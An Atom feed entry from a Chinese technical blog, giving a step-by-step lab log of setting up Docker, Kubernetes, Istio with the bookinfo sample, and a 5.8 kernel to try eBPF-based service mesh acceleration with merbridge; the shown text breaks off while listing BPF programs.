<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ELSSM</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="elssm.github.io/"/>
  <updated>2022-03-08T03:16:03.067Z</updated>
  <id>elssm.github.io/</id>
  
  <author>
    <name>elssm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>从0到0.5:eBPF加速ServiceMesh实践</title>
    <link href="elssm.github.io/2022/02/28/%E4%BB%8E0%E5%88%B00-5-eBPF%E5%8A%A0%E9%80%9FServiceMesh%E5%AE%9E%E8%B7%B5/"/>
    <id>elssm.github.io/2022/02/28/从0到0-5-eBPF加速ServiceMesh实践/</id>
    <published>2022-02-28T05:06:42.000Z</published>
    <updated>2022-03-08T03:16:03.067Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><h5 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h5><h6 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br></pre></td></tr></table></figure><h6 id="导入存储库的GPG密钥"><a href="#导入存储库的GPG密钥" class="headerlink" title="导入存储库的GPG密钥"></a>导入存储库的GPG密钥</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><h6 id="添加Docker-APT存储库到系统"><a href="#添加Docker-APT存储库到系统" class="headerlink" title="添加Docker APT存储库到系统"></a>添加Docker APT存储库到系统</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</span><br></pre></td></tr></table></figure><h6 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p>docker版本：20.10.12</p><p>查看docker服务启动状况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# systemctl status docker</span><br><span class="line">● docker.service - Docker Application Container Engine</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled</span><br><span class="line">   Active: active (running) since Thu 2022-02-10 07:23:33 UTC; 10min ago</span><br><span class="line">     Docs: https://docs.docker.com</span><br><span class="line"> Main PID: 2663 (dockerd)</span><br><span class="line">    Tasks: 9</span><br><span class="line">   CGroup: /system.slice/docker.service</span><br><span class="line">           └─2663 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.so</span><br><span class="line"></span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.763625795Z" level=warn</span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.763656800Z" level=warn</span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.763676563Z" level=warn</span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.764235662Z" level=info</span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.961536719Z" level=info</span><br><span class="line">Feb 10 07:23:33 ubuntu dockerd[2663]: time="2022-02-10T07:23:33.039790463Z" level=info</span><br><span class="line">Feb 10 07:23:33 ubuntu dockerd[2663]: time="2022-02-10T07:23:33.070305288Z" level=info</span><br><span class="line">Feb 10 07:23:33 ubuntu dockerd[2663]: time="2022-02-10T07:23:33.070463909Z" level=info</span><br><span class="line">Feb 10 07:23:33 ubuntu systemd[1]: Started Docker Application Container Engine.</span><br></pre></td></tr></table></figure><h5 id="Kubernetes安装"><a href="#Kubernetes安装" class="headerlink" title="Kubernetes安装"></a>Kubernetes安装</h5><h6 id="安装https工具使得apt支持ssl传输"><a href="#安装https工具使得apt支持ssl传输" class="headerlink" title="安装https工具使得apt支持ssl传输"></a>安装https工具使得apt支持ssl传输</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y apt-transport-https</span><br></pre></td></tr></table></figure><h6 id="使用阿里云的源"><a href="#使用阿里云的源" class="headerlink" title="使用阿里云的源"></a>使用阿里云的源</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add -</span><br><span class="line">echo "deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main" &gt; /etc/apt/sources.list.d/kubernetes.list</span><br></pre></td></tr></table></figure><h6 id="或使用中科大的源"><a href="#或使用中科大的源" class="headerlink" title="或使用中科大的源"></a>或使用中科大的源</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt; /etc/apt/sources.list.d/kubernetes.list</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kubernetes/apt kubernetes-xenial main</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>更新apt报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  The following signatures couldn't be verified because the public key is not available: NO_PUBKEY FEEA9169307EA071 NO_PUBKEY 8B57C5C2836F4BEB</span><br><span class="line">Reading package lists... Done</span><br><span class="line">W: GPG error: http://mirrors.ustc.edu.cn/kubernetes/apt kubernetes-xenial InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY FEEA9169307EA071 NO_PUBKEY 8B57C5C2836F4BEB</span><br><span class="line">E: The repository 'http://mirrors.ustc.edu.cn/kubernetes/apt kubernetes-xenial InRelease' is not signed.</span><br><span class="line">N: Updating from such a repository can't be done securely, and is therefore disabled by default.</span><br><span class="line">N: See apt-secure(8) manpage for repository creation and user configuration details.</span><br></pre></td></tr></table></figure><p>报错提示我们需要制作一个key，其中<code>836F4BEB</code>是<code>NO_PUBKEY</code>的后八位</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg --keyserver keyserver.ubuntu.com --recv-keys 836F4BEB</span><br><span class="line">gpg --export --armor  836F4BEB | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>之后重新<code>apt-get update</code>即可</p><h6 id="下载相关工具"><a href="#下载相关工具" class="headerlink" title="下载相关工具"></a>下载相关工具</h6><p>修改docker的<code>daemon.json</code>，将cgroup驱动和k8s设置为一致</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu1:~# cat /etc/docker/daemon.json</span><br><span class="line">    &#123;</span><br><span class="line">        "exec-opts": ["native.cgroupdriver=systemd"],</span><br><span class="line">        "registry-mirrors": [</span><br><span class="line">        "https://docker.mirrors.ustc.edu.cn/",</span><br><span class="line">        "https://hub-mirror.c.163.com"],</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y kubelet kubeadm kubectl</span><br></pre></td></tr></table></figure><h6 id="查看k8s版本"><a href="#查看k8s版本" class="headerlink" title="查看k8s版本"></a>查看k8s版本</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl version</span><br><span class="line">Client Version: version.Info&#123;Major:"1", Minor:"23", GitVersion:"v1.23.3", GitCommit:"816c97ab8cff8a1c72eccca1026f7820e93e0d25", GitTreeState:"clean", BuildDate:"2022-01-25T21:25:17Z", GoVersion:"go1.17.6", Compiler:"gc", Platform:"linux/amd64"&#125;</span><br><span class="line">Server Version: version.Info&#123;Major:"1", Minor:"23", GitVersion:"v1.23.3", GitCommit:"816c97ab8cff8a1c72eccca1026f7820e93e0d25", GitTreeState:"clean", BuildDate:"2022-01-25T21:19:12Z", GoVersion:"go1.17.6", Compiler:"gc", Platform:"linux/amd64"&#125;</span><br></pre></td></tr></table></figure><h6 id="初始化master节点"><a href="#初始化master节点" class="headerlink" title="初始化master节点"></a>初始化master节点</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init \</span><br><span class="line">--apiserver-advertise-address=192.168.19.84 \</span><br><span class="line">--image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">--pod-network-cidr=10.244.0.0/16</span><br></pre></td></tr></table></figure><h6 id="配置kubectl工具"><a href="#配置kubectl工具" class="headerlink" title="配置kubectl工具"></a>配置kubectl工具</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br></pre></td></tr></table></figure><h6 id="查看节点状态"><a href="#查看节点状态" class="headerlink" title="查看节点状态"></a>查看节点状态</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get nodes</span><br><span class="line">NAME     STATUS     ROLES                  AGE   VERSION</span><br><span class="line">ubuntu   NotReady   control-plane,master   15m   v1.23.3</span><br></pre></td></tr></table></figure><p>状态显示为<code>NotReady</code>，查看日志，发现没有安装网络插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# journalctl -u kubelet -f</span><br><span class="line">-- Logs begin at Mon 2020-02-24 09:48:27 UTC. --</span><br><span class="line">Feb 10 08:08:58 ubuntu kubelet[11230]: I0210 08:08:58.892005   11230 cni.go:240] "Unable to update cni config" err="no networks found in /etc/cni/net.d"</span><br></pre></td></tr></table></figure><h6 id="安装pod插件flannel"><a href="#安装pod插件flannel" class="headerlink" title="安装pod插件flannel"></a>安装pod插件flannel</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br><span class="line">Warning: policy/v1beta1 PodSecurityPolicy is deprecated in v1.21+, unavailable in v1.25+</span><br><span class="line">podsecuritypolicy.policy/psp.flannel.unprivileged created</span><br><span class="line">clusterrole.rbac.authorization.k8s.io/flannel created</span><br><span class="line">clusterrolebinding.rbac.authorization.k8s.io/flannel created</span><br><span class="line">serviceaccount/flannel created</span><br><span class="line">configmap/kube-flannel-cfg created</span><br><span class="line">daemonset.apps/kube-flannel-ds created</span><br></pre></td></tr></table></figure><h6 id="再次查看节点状态"><a href="#再次查看节点状态" class="headerlink" title="再次查看节点状态"></a>再次查看节点状态</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get nodes</span><br><span class="line">NAME     STATUS   ROLES                  AGE   VERSION</span><br><span class="line">ubuntu   Ready    control-plane,master   18m   v1.23.3</span><br></pre></td></tr></table></figure><h6 id="允许master部署pod"><a href="#允许master部署pod" class="headerlink" title="允许master部署pod"></a>允许master部署pod</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl taint nodes --all node-role.kubernetes.io/master-</span><br></pre></td></tr></table></figure><h4 id="服务网格"><a href="#服务网格" class="headerlink" title="服务网格"></a>服务网格</h4><p>服务网格是一个专注于处理服务间通信的基础设施层，它负责在现代云原生应用组成的复杂网络拓扑中可靠的传递请求</p><p>服务网格特点</p><ul><li>轻量级的网络代理</li><li>应用无感知</li><li>应用之间的流量由服务网格接管</li><li>服务间的调用可能出现的超时、重试、监控、追踪等工作下沉到服务网格层处理</li></ul><p>网格一般由数据平面和控制平面组成，数据平面负责在服务中部署一个sidecar的请求代理，控制平面负责请求代理之间的交互，以及用户与请求代理的交互。</p><h5 id="Istio"><a href="#Istio" class="headerlink" title="Istio"></a>Istio</h5><p>通过负载均衡、service-to-service身份验证、监视等方法，Istio可以轻松地创建部署服务网格，而服务代码更改很少或没有更改，我们可以在整个环境中部署一个特殊的sidecar代理来为服务添加Istio支持，该代理可以拦截微服务之间的所有网络通信，然后使用其控制平面功能来配置和管理Istio，其中包括：</p><ul><li>HTTP、gRPC、WebSocket和TCP流量的自动负载平衡</li><li>使用丰富的路由规则、重试、故障转移和故障注入对流量欣慰进行细粒度控制</li><li>支持访问控制、速率限制和配额的可插拔策略层和配置API</li><li>集群内所有流量的自动度量、日志和跟踪，包括集群入口和出口</li><li>在具有强大的基于身份的身份验证和授权的集群中实现安全的服务到服务通信</li></ul><p>Istio的核心功能</p><h6 id="流量管理"><a href="#流量管理" class="headerlink" title="流量管理"></a>流量管理</h6><p>Istio的简单规则配置和流量路由允许控制服务之间的流量和API调用流，Istio简化了服务级属性(如断路器，超时和重试)的配置，并且简化了设置重要任务(如A/B测试，金丝雀测试和按百分比划分的分阶段测试)的工作。有了过呢好的流量可视性和开箱即用故障恢复功能，可以在问题产生之前捕获问题，使调用更可靠，网络更健壮。</p><h6 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h6><p>Istio的安全功能使开发人员可以专注于应用程序级别的安全。Istio提供了底层的安全通信通道，并按比例管理服务通信的身份验证、授权和加密。通过Istio，服务通信在缺省情况下是安全的。允许在不同的协议和运行时之间一致地实施策略。</p><h6 id="观察"><a href="#观察" class="headerlink" title="观察"></a>观察</h6><p>Isio的见状跟踪、监视和日志功能使得我们可以更加深入了解服务网格部署。通过Istio的监视功能，可以真正理解服务性能如何影响上游和下游的事情。而它的自定义仪表板提供了对所有服务的性能的可见性。</p><h5 id="安装Istio"><a href="#安装Istio" class="headerlink" title="安装Istio"></a>安装Istio</h5><p>安装文档地址：<a href="https://istio.io/latest/docs/setup/getting-started/" target="_blank" rel="noopener">https://istio.io/latest/docs/setup/getting-started/</a></p><h6 id="下载1-11-6版本"><a href="#下载1-11-6版本" class="headerlink" title="下载1.11.6版本"></a>下载1.11.6版本</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.11.6 sh -</span><br></pre></td></tr></table></figure><h6 id="进入到下载目录"><a href="#进入到下载目录" class="headerlink" title="进入到下载目录"></a>进入到下载目录</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd istio-1.11.6/</span><br></pre></td></tr></table></figure><h6 id="添加istioctl客户端到路径"><a href="#添加istioctl客户端到路径" class="headerlink" title="添加istioctl客户端到路径"></a>添加istioctl客户端到路径</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PWD/bin:$PATH</span><br></pre></td></tr></table></figure><h6 id="查看Istio部署模式"><a href="#查看Istio部署模式" class="headerlink" title="查看Istio部署模式"></a>查看Istio部署模式</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# istioctl profile list</span><br><span class="line">Istio configuration profiles:</span><br><span class="line">    default</span><br><span class="line">    demo</span><br><span class="line">    empty</span><br><span class="line">    external</span><br><span class="line">    minimal</span><br><span class="line">    openshift</span><br><span class="line">    preview</span><br><span class="line">    remote</span><br></pre></td></tr></table></figure><h6 id="设置部署模式为demo"><a href="#设置部署模式为demo" class="headerlink" title="设置部署模式为demo"></a>设置部署模式为demo</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">istioctl manifest apply --set profile=demo</span><br></pre></td></tr></table></figure><h6 id="添加命名空间的标签"><a href="#添加命名空间的标签" class="headerlink" title="添加命名空间的标签"></a>添加命名空间的标签</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl label namespace default istio-injection=enabled</span><br><span class="line">namespace/default labeled</span><br></pre></td></tr></table></figure><h5 id="部署案例应用"><a href="#部署案例应用" class="headerlink" title="部署案例应用"></a>部署案例应用</h5><h6 id="部署bookinfo案例"><a href="#部署bookinfo案例" class="headerlink" title="部署bookinfo案例"></a>部署bookinfo案例</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml</span><br><span class="line">service/details created</span><br><span class="line">serviceaccount/bookinfo-details created</span><br><span class="line">deployment.apps/details-v1 created</span><br><span class="line">service/ratings created</span><br><span class="line">serviceaccount/bookinfo-ratings created</span><br><span class="line">deployment.apps/ratings-v1 created</span><br><span class="line">service/reviews created</span><br><span class="line">serviceaccount/bookinfo-reviews created</span><br><span class="line">deployment.apps/reviews-v1 created</span><br><span class="line">deployment.apps/reviews-v2 created</span><br><span class="line">deployment.apps/reviews-v3 created</span><br><span class="line">service/productpage created</span><br><span class="line">serviceaccount/bookinfo-productpage created</span><br><span class="line">deployment.apps/productpage-v1 created</span><br></pre></td></tr></table></figure><h6 id="查看pod情况"><a href="#查看pod情况" class="headerlink" title="查看pod情况"></a>查看pod情况</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# kubectl get pods</span><br><span class="line">NAME                              READY   STATUS    RESTARTS   AGE</span><br><span class="line">details-v1-5498c86cf5-bhv2h       2/2     Running   0          13m</span><br><span class="line">productpage-v1-65b75f6885-p6k2w   2/2     Running   0          13m</span><br><span class="line">ratings-v1-b477cf6cf-k84kr        2/2     Running   0          13m</span><br><span class="line">reviews-v1-79d546878f-q6f62       2/2     Running   0          13m</span><br><span class="line">reviews-v2-548c57f459-cqq2r       2/2     Running   0          13m</span><br><span class="line">reviews-v3-6dd79655b9-gr42h       2/2     Running   0          13m</span><br></pre></td></tr></table></figure><h6 id="检查运行是否正常"><a href="#检查运行是否正常" class="headerlink" title="检查运行是否正常"></a>检查运行是否正常</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# kubectl exec "$(kubectl get pod -l app=ratings -o jsonpath='&#123;.items[0].metadata.name&#125;')" -c ratings -- curl -sS productpage:9080/productpage | grep -o "&lt;title&gt;.*&lt;/title&gt;"</span><br><span class="line">&lt;title&gt;Simple Bookstore App&lt;/title&gt;</span><br></pre></td></tr></table></figure><h5 id="开启外部访问"><a href="#开启外部访问" class="headerlink" title="开启外部访问"></a>开启外部访问</h5><h6 id="关联Istio网关"><a href="#关联Istio网关" class="headerlink" title="关联Istio网关"></a>关联Istio网关</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f samples/bookinfo/networking/bookinfo-gateway.yaml</span><br></pre></td></tr></table></figure><h6 id="查看服务外部访问方式"><a href="#查看服务外部访问方式" class="headerlink" title="查看服务外部访问方式"></a>查看服务外部访问方式</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# kubectl get svc istio-ingressgateway -n istio-system</span><br><span class="line">NAME                   TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)                                                                      AGE</span><br><span class="line">istio-ingressgateway   LoadBalancer   10.96.244.67   &lt;none&gt;        15021:32085/TCP,80:31356/TCP,443:31869/TCP,31400:31862/TCP,15443:31190/TCP</span><br></pre></td></tr></table></figure><h6 id="修改访问方式为NodePort"><a href="#修改访问方式为NodePort" class="headerlink" title="修改访问方式为NodePort"></a>修改访问方式为NodePort</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl edit svc istio-ingressgateway -n istio-system</span><br></pre></td></tr></table></figure><h6 id="访问测试"><a href="#访问测试" class="headerlink" title="访问测试"></a>访问测试</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# curl 192.168.19.85:31356/productpage</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;Simple Bookstore App&lt;/title&gt;</span><br><span class="line">&lt;meta charset="utf-8"&gt;</span><br><span class="line">&lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;</span><br><span class="line">&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Latest compiled and minified CSS --&gt;</span><br><span class="line">&lt;link rel="stylesheet" href="static/bootstrap/css/bootstrap.min.css"&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Optional theme --&gt;</span><br><span class="line">&lt;link rel="stylesheet" href="static/bootstrap/css/bootstrap-theme.min.css"&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br></pre></td></tr></table></figure><h4 id="ebpf加速ServiceMesh实验"><a href="#ebpf加速ServiceMesh实验" class="headerlink" title="ebpf加速ServiceMesh实验"></a>ebpf加速ServiceMesh实验</h4><p>代码地址：<a href="https://github.com/merbridge/merbridge" target="_blank" rel="noopener">https://github.com/merbridge/merbridge</a></p><h5 id="升级内核"><a href="#升级内核" class="headerlink" title="升级内核"></a>升级内核</h5><p>实验要求内核版本&gt;=5.7，首先我们还是通过命令查询指定版本的Linux镜像包，发现没有找到可用的版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# apt-cache search linux| grep 5.8</span><br></pre></td></tr></table></figure><p>因此我们直接去官方下载</p><p>地址：<a href="https://kernel.ubuntu.com/~kernel-ppa/mainline/" target="_blank" rel="noopener">https://kernel.ubuntu.com/~kernel-ppa/mainline/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8/amd64/linux-headers-5.8.0-050800-generic_5.8.0-050800.202008022230_amd64.deb</span><br><span class="line">wget -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8/amd64/linux-headers-5.8.0-050800_5.8.0-050800.202008022230_all.deb</span><br><span class="line">wget -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8/amd64/linux-image-unsigned-5.8.0-050800-generic_5.8.0-050800.202008022230_amd64.deb</span><br><span class="line">wget -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8/amd64/linux-modules-5.8.0-050800-generic_5.8.0-050800.202008022230_amd64.deb</span><br></pre></td></tr></table></figure><p>安装内核Deb软件包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# sudo dpkg -i *.deb</span><br></pre></td></tr></table></figure><p>安装结束后，重新启动系统后查看内核版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# uname -r</span><br><span class="line">5.8.0-050800-generic</span><br></pre></td></tr></table></figure><h5 id="相关版本说明"><a href="#相关版本说明" class="headerlink" title="相关版本说明"></a>相关版本说明</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           20.10.12</span><br><span class="line">root@ubuntu:~# kubectl version</span><br><span class="line">Client Version: version.Info&#123;Major:"1", Minor:"23", GitVersion:"v1.23.3", GitCommit:"816c97ab8cff8a1c72eccca1026f7820e93e0d25", GitTreeState:"clean", BuildDate:"2022-01-25T21:25:17Z", GoVersion:"go1.17.6", Compiler:"gc", Platform:"linux/amd64"&#125;</span><br><span class="line">Server Version: version.Info&#123;Major:"1", Minor:"23", GitVersion:"v1.23.3", GitCommit:"816c97ab8cff8a1c72eccca1026f7820e93e0d25", GitTreeState:"clean", BuildDate:"2022-01-25T21:19:12Z", GoVersion:"go1.17.6", Compiler:"gc", Platform:"linux/amd64"&#125;</span><br><span class="line">root@ubuntu:~# lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 20.04 LTS</span><br><span class="line">Release:        20.04</span><br><span class="line">Codename:       focal</span><br><span class="line">root@ubuntu:~# uname -r</span><br><span class="line">5.8.0-050800-generic</span><br></pre></td></tr></table></figure><h5 id="yaml文件apply之前的ebpf数据"><a href="#yaml文件apply之前的ebpf数据" class="headerlink" title="yaml文件apply之前的ebpf数据"></a>yaml文件apply之前的ebpf数据</h5><p>列出系统中所有cgroup上的附加程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# bpftool cgroup tree</span><br><span class="line">CgroupPath</span><br><span class="line">ID       AttachType      AttachFlags     Name</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-udevd.service</span><br><span class="line">    21       ingress</span><br><span class="line">    20       egress</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-journald.service</span><br><span class="line">    19       ingress</span><br><span class="line">    18       egress</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-logind.service</span><br><span class="line">    23       ingress</span><br><span class="line">    22       egress</span><br></pre></td></tr></table></figure><p>查看系统中已经加载的所有BPF程序</p><figure class="highlight shell"><table><tr><td 